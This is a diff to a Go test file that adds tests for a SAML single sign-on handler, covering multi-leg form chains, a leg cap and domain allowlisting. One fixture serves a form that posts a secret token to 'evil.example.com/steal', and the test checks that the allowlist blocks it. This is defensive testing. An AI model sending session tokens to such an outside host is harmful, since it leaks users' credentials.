@@ -362,6 +362,137 @@ func TestHandleSAMLSSO(t *testing.T) {
 	}
 }
 
+func TestHandleSAMLSSOMultiLeg(t *testing.T) {
+	var (
+		idpHit  atomic.Int32
+		acsHit  atomic.Int32
+		leg2Hit atomic.Int32
+	)
+
+	mux := http.NewServeMux()
+	srv := httptest.NewTLSServer(mux)
+	defer srv.Close()
+
+	srvHost, _ := url.Parse(srv.URL)
+
+	mux.HandleFunc("/idp", func(w http.ResponseWriter, _ *http.Request) {
+		idpHit.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><body class="saml-post-binding">
+			<form action="%s/acs">
+				<input type="hidden" name="SAMLResponse" value="resp" />
+			</form></body></html>`, srv.URL)
+	})
+	mux.HandleFunc("/acs", func(w http.ResponseWriter, _ *http.Request) {
+		acsHit.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><body onload="document.forms[0].submit()">
+			<form action="%s/authgwy/acs">
+				<input type="hidden" name="token" value="session-token" />
+			</form></body></html>`, srv.URL)
+	})
+	mux.HandleFunc("/authgwy/acs", func(w http.ResponseWriter, _ *http.Request) {
+		leg2Hit.Add(1)
+		http.SetCookie(w, &http.Cookie{Name: "JSESSIONID", Value: "main-app", Path: "/", HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode}) //nolint:gosec
+		w.WriteHeader(200)
+	})
+
+	jar, _ := cookiejar.New(nil)
+	client := srv.Client()
+	client.Jar = jar
+
+	body := fmt.Sprintf(`<html><meta http-equiv="refresh" content="0;url=%s/idp" /></html>`, srv.URL)
+	ok := handleSAMLSSO(context.Background(), client, []byte(body), srv.URL, []string{srvHost.Hostname()})
+	if !ok {
+		t.Fatal("expected handleSAMLSSO to succeed")
+	}
+	if idpHit.Load() != 1 {
+		t.Errorf("IdP hit = %d, want 1", idpHit.Load())
+	}
+	if acsHit.Load() != 1 {
+		t.Errorf("ACS hit = %d, want 1", acsHit.Load())
+	}
+	if leg2Hit.Load() != 1 {
+		t.Errorf("leg 2 hit = %d, want 1", leg2Hit.Load())
+	}
+}
+
+func TestHandleSAMLSSOMultiLegDomainBlock(t *testing.T) {
+	var acsHit atomic.Int32
+
+	mux := http.NewServeMux()
+	srv := httptest.NewTLSServer(mux)
+	defer srv.Close()
+
+	srvHost, _ := url.Parse(srv.URL)
+
+	mux.HandleFunc("/idp", func(w http.ResponseWriter, _ *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><body class="saml-post-binding">
+			<form action="%s/acs">
+				<input type="hidden" name="SAMLResponse" value="resp" />
+			</form></body></html>`, srv.URL)
+	})
+	mux.HandleFunc("/acs", func(w http.ResponseWriter, _ *http.Request) {
+		acsHit.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprint(w, `<html><form action="https://evil.example.com/steal">
+			<input type="hidden" name="token" value="secret" />
+		</form></html>`)
+	})
+
+	jar, _ := cookiejar.New(nil)
+	client := srv.Client()
+	client.Jar = jar
+
+	body := fmt.Sprintf(`<html><meta http-equiv="refresh" content="0;url=%s/idp" /></html>`, srv.URL)
+	ok := handleSAMLSSO(context.Background(), client, []byte(body), srv.URL, []string{srvHost.Hostname()})
+	if !ok {
+		t.Fatal("SSO should succeed (ACS POST worked), but leg 2 should be blocked")
+	}
+	if acsHit.Load() != 1 {
+		t.Errorf("ACS hit = %d, want 1", acsHit.Load())
+	}
+}
+
+func TestHandleSAMLSSOMultiLegCap(t *testing.T) {
+	var legHits atomic.Int32
+
+	mux := http.NewServeMux()
+	srv := httptest.NewTLSServer(mux)
+	defer srv.Close()
+
+	srvHost, _ := url.Parse(srv.URL)
+
+	mux.HandleFunc("/idp", func(w http.ResponseWriter, _ *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><body class="saml-post-binding">
+			<form action="%s/acs">
+				<input type="hidden" name="SAMLResponse" value="resp" />
+			</form></body></html>`, srv.URL)
+	})
+	mux.HandleFunc("/acs", func(w http.ResponseWriter, _ *http.Request) {
+		legHits.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><form action="%s/acs">
+			<input type="hidden" name="loop" value="again" />
+		</form></html>`, srv.URL)
+	})
+
+	jar, _ := cookiejar.New(nil)
+	client := srv.Client()
+	client.Jar = jar
+
+	body := fmt.Sprintf(`<html><meta http-equiv="refresh" content="0;url=%s/idp" /></html>`, srv.URL)
+	_ = handleSAMLSSO(context.Background(), client, []byte(body), srv.URL, []string{srvHost.Hostname()})
+
+	// 1 initial ACS hit + samlMaxLegs follow-up hits
+	want := int32(1 + samlMaxLegs)
+	if legHits.Load() != want {
+		t.Errorf("ACS hit count = %d, want %d (1 initial + %d capped legs)", legHits.Load(), want, samlMaxLegs)
+	}
+}
+
 func TestHandleSAMLSSONoRedirect(t *testing.T) {
 	body := `<html><body>Access denied, no redirect</body></html>`
 	ok := handleSAMLSSO(context.Background(), &http.Client{}, []byte(body), "https://example.com", nil)
@@ -621,6 +752,61 @@ func TestInitSAMLSessionIdPDomainBlocked(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "not in allowed domains") {
 		t.Errorf("unexpected error: %v", err)
+	}
+}
+
+func TestInitSAMLSessionFormFirstMultiLeg(t *testing.T) {
+	var step atomic.Int32
+	mux := http.NewServeMux()
+	srv := httptest.NewTLSServer(mux)
+	defer srv.Close()
+
+	// Step 1: init URL returns form with SAMLRequest
+	mux.HandleFunc("/saml.redirect", func(w http.ResponseWriter, _ *http.Request) {
+		step.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><form action="%s/idp/saml">
+			<input type="hidden" name="SAMLRequest" value="req"/>
+			<input type="hidden" name="RelayState" value="/"/>
+		</form></html>`, srv.URL)
+	})
+
+	// Step 2: IdP returns SAMLResponse
+	mux.HandleFunc("/idp/saml", func(w http.ResponseWriter, _ *http.Request) {
+		step.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><form action="%s/saml.digest">
+			<input type="hidden" name="SAMLResponse" value="resp"/>
+			<input type="hidden" name="RelayState" value="/"/>
+		</form></html>`, srv.URL)
+	})
+
+	// Step 3: ACS processes SAMLResponse, returns form to auth gateway
+	mux.HandleFunc("/saml.digest", func(w http.ResponseWriter, _ *http.Request) {
+		step.Add(1)
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><form action="%s/authgwy/acs">
+			<input type="hidden" name="token" value="session-token"/>
+		</form></html>`, srv.URL)
+	})
+
+	// Step 4: auth gateway sets session cookie
+	mux.HandleFunc("/authgwy/acs", func(w http.ResponseWriter, _ *http.Request) {
+		step.Add(1)
+		http.SetCookie(w, &http.Cookie{Name: "session", Value: "authenticated", HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode})
+		w.WriteHeader(200)
+	})
+
+	jar, _ := cookiejar.New(nil)
+	client := srv.Client()
+	client.Jar = jar
+
+	err := InitSAMLSession(context.Background(), client, "/saml.redirect", srv.URL, []string{})
+	if err != nil {
+		t.Fatalf("InitSAMLSession failed: %v", err)
+	}
+	if step.Load() != 4 {
+		t.Errorf("expected 4 steps, got %d (multi-leg chain not fully followed)", step.Load())
 	}
 }
 
@@ -1100,6 +1286,75 @@ func TestTrySAMLSSO200POSTNotReplayed(t *testing.T) {
 	}
 	if resp.Status != 200 {
 		t.Errorf("status = %d, want 200", resp.Status)
+	}
+}
+
+func TestTrySAMLSSO200WithNonSAMLFormAndRedirect(t *testing.T) {
+	var apiCalls atomic.Int32
+	mux := http.NewServeMux()
+	srv := httptest.NewTLSServer(mux)
+	defer srv.Close()
+
+	srvHost, _ := url.Parse(srv.URL)
+
+	mux.HandleFunc("/page", func(w http.ResponseWriter, _ *http.Request) {
+		n := apiCalls.Add(1)
+		if n == 1 {
+			w.Header().Set("Content-Type", "text/html")
+			// Page with a non-SAML first form (search bar with hidden
+			// CSRF token) AND a second form with SAMLRequest. The
+			// pre-filter triggers (page has <form> + SAMLRequest),
+			// but parseSAMLForm picks up the first form (search bar).
+			// formData.Get("SAMLRequest") is empty, so followSAMLFormChain
+			// is not called. Without the widened fallback, the condition
+			// action == "" is false → handleSAMLSSO is skipped.
+			// With the widened fallback, handleSAMLSSO is tried and
+			// follows the meta-refresh redirect.
+			_, _ = fmt.Fprintf(w, `<html>
+				<meta http-equiv="refresh" content="0;url=%s/idp/sso" />
+				<form action="%s/search">
+					<input type="hidden" name="csrf" value="tok"/>
+				</form>
+				<form action="%s/idp/sso">
+					<input type="hidden" name="SAMLRequest" value="req"/>
+				</form>
+				</html>`, srv.URL, srv.URL, srv.URL)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = fmt.Fprint(w, `{"data":"ok"}`)
+	})
+	mux.HandleFunc("/idp/sso", func(w http.ResponseWriter, _ *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		_, _ = fmt.Fprintf(w, `<html><body class="saml-post-binding">
+			<form action="%s/saml/consume">
+				<input type="hidden" name="SAMLResponse" value="resp"/>
+			</form></body></html>`, srv.URL)
+	})
+	mux.HandleFunc("/saml/consume", func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(200)
+	})
+
+	jar, _ := cookiejar.New(nil)
+	client := srv.Client()
+	client.Jar = jar
+
+	p := newTestProxy(client)
+	pa := testPluginAuth(srv.URL)
+	pa.Client = client
+	pa.IsKerberos = true
+	pa.AllowedDomains = []string{srvHost.Hostname()}
+	p.RegisterPlugin("testfallback", pa)
+
+	resp := p.Execute(context.Background(), "testfallback", protocol.Message{
+		ID: "req-fallback", Type: protocol.TypeHTTPRequest,
+		Method: "GET", Path: "/page",
+	})
+	if resp.Status != 200 {
+		t.Errorf("status = %d, want 200", resp.Status)
+	}
+	if apiCalls.Load() != 2 {
+		t.Errorf("api calls = %d, want 2 (non-SAML form should not block redirect-based SSO fallback)", apiCalls.Load())
 	}
 }
 
